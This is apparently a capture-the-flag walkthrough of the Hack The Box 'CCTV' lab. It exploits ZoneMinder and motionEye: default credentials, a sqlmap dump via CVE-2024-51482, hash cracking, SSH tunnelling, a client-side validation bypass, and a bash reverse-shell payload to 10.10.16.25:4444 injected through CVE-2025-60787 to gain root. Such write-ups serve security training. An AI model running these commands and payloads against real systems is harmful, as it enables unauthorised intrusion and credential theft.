<img width="1540" height="547" alt="image" src="https://github.com/user-attachments/assets/0594de01-e1fd-4fd4-830f-a08cda8ac1db" />
<img width="691" height="547" alt="image" src="https://github.com/user-attachments/assets/2d0710bd-0d1b-4cee-8615-10b3ee720f97" />
<img width="1523" height="730" alt="image" src="https://github.com/user-attachments/assets/e5021ab3-fb84-481b-ba74-a9e889febf55" />
<img width="1538" height="418" alt="image" src="https://github.com/user-attachments/assets/4c29b5d1-783b-48e3-93ce-148fc72eccda" />
<img width="1538" height="418" alt="image" src="https://github.com/user-attachments/assets/811d3f96-00c8-41f8-bffb-edb291009d53" />
<img width="1523" height="752" alt="image" src="https://github.com/user-attachments/assets/15979602-565e-426c-b062-cb82d29bf876" />
CVE-2025-60787: “Image File Name” field
<img width="1523" height="752" alt="image" src="https://github.com/user-attachments/assets/e83c873b-0472-4c31-b4f3-e9fc6a015ea9" />

# CCTV – Hack The Box Walkthrough

**Target:** CCTV (HTB Machine)
**Platform:** Hack The Box (VPN-based lab)

---

## 1. Initial Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN scan.txt cctv.htb
```

* `-sC` runs default NSE scripts to check for common misconfigurations and vulnerabilities
* `-sV` identifies service versions (useful for finding known exploits/CVEs)
* `-oN` saves output for later analysis

### Open Ports

```
22  SSH
80  HTTP
```

* Port 22 (SSH): Used for remote system access after credentials are obtained
* Port 80 (HTTP): Entry point to web application

---

## 2. DNS Mapping

```bash
sudo nano /etc/hosts
```

Add:

```
<IP>    cctv.htb
```

* `/etc/hosts` is checked before DNS queries
* Maps domain name to IP locally
* Required because HTB domains are not publicly resolvable

---

## 3. Web Enumeration

Visit:

```
http://cctv.htb/zm
```

### Observations

* ZoneMinder login panel
* Version exposed (useful for CVE lookup)

ZoneMinder is a CCTV surveillance system that interacts with a backend MySQL database and system-level processes. Any input fields may directly interact with database queries.

---

## 4. Default Credentials

```
admin : admin
```

* Common misconfiguration
* Allows authentication bypass without exploitation
* Provides access to internal application functionality

---

## 5. SQL Injection (CVE-2024-51482)

* Time-based blind SQL injection in `tid` parameter
* User input is directly embedded into SQL queries
* No output is shown, so attacker relies on response delay

### How it Works Internally

* Payloads like `SLEEP(5)` delay server response
* If condition is true  delay occurs
* If false  normal response
* Data is extracted bit by bit using timing differences

### Exploitation

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=<cookie>"
-D zm -T Users -C Username,Password --dump --batch --technique=T --time-sec=5 --threads=1 --risk=3 --level=5


```

### Flags Breakdown

* `--cookie`  passes authenticated session
* `-D zm`  selects database
* `-T Users`  selects table
* `-C Username,Password`  extracts specific columns
* `--dump`→ retrieves data
* `--technique=T`  forces time-based SQLi
* `--time-sec=5` delay threshold
* `--threads=1`  avoids timing inconsistency
* `--risk` and `--level`  increase payload depth

### Result

* Extracted bcrypt hashes

---

## 6. Password Cracking

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

* `-m 3200` specifies bcrypt hashing algorithm
* bcrypt is slow by design but weak passwords are still crackable
* `rockyou.txt` contains common passwords

### Result

```
mark : opensesame
```

* Weak password defeats strong hashing

---

## 7. SSH Access

```bash
ssh mark@cctv.htb
```

* Uses valid credentials for system login
* Provides shell access to target machine
* Moves from web layer to system layer

---

## 8. Internal Service Discovery

```bash
ss -tlnp
```

* `-t` → TCP connections
* `-l` → listening services
* `-n` → numeric format
* `-p` → process info

### Finding

```
127.0.0.1:8765
```

* Service bound to localhost
* Not externally accessible
* Only accessible from inside the machine

---

## 9. Port Forwarding

```bash
ssh -L 8766:127.0.0.1:8765 mark@cctv.htb
```

### How it Works

* SSH creates an encrypted tunnel
* Local port **8766** listens on attacker machine
* Traffic is forwarded to `127.0.0.1:8765` on target

### Why Needed

* Internal services are not exposed externally
* Port forwarding exposes them securely

### Access

```
http://127.0.0.1:8766
```

---

## 10. motionEye Credentials

```bash
cat /etc/motion/motion.conf
```

* Configuration file for motionEye service
* Contains admin password hash
* Sensitive files often store credentials
* Misconfigured permissions allow reading

---

## 11. Command Injection (CVE-2025-60787)

* Command injection via **“Image File Name”** field
* Input is passed to system shell without proper validation
* Allows execution of arbitrary commands

---

## 12. Bypass Validation

Open browser console:

```javascript
configUiValid = function() { return true; };
```

### What this does

* Overrides JavaScript validation function
* Forces application to accept any input
* Works because validation is only client-side
* Server does not re-validate input

---

## 13. Reverse Shell Payload

```bash
$(bash -c "bash -i >& /dev/tcp/10.10.16.25/4444 0>&1").%Y-%m-%d-%H-%M-%S
```

### Breakdown

* `$()` executes command in subshell
* `bash -c` runs command string
* `bash -i` interactive shell
* `/dev/tcp/IP/PORT` creates TCP connection to attacker
* `>&` redirects stdout and stderr
* `0>&1` binds input to same stream

### Why Timestamp is Added

* Application expects filename format
* `%Y-%m-%d-%H-%M-%S` satisfies requirement
* Without it, payload may be rejected

---

## 14. Listener

```bash
nc -lvnp 4444
```

* `-l` listen mode

* `-v` verbose

* `-n` no DNS resolution

* `-p` specify port

* Waits for incoming reverse shell connection

---

## 15. Trigger Execution

```bash
curl http://127.0.0.1:7999/1/action/snapshot
```

* Sends request to motion service
* Triggers snapshot functionality
* Executes injected command
* Payload runs only when snapshot is triggered

---

## 16. Root Access

```bash
whoami
```

### Output

```
root
```

* motionEye service runs as root
* Command execution inherits root privileges
* Leads to full system compromise

---

## 17. Flags

```bash
cat user.txt
cat /root/root.txt
```
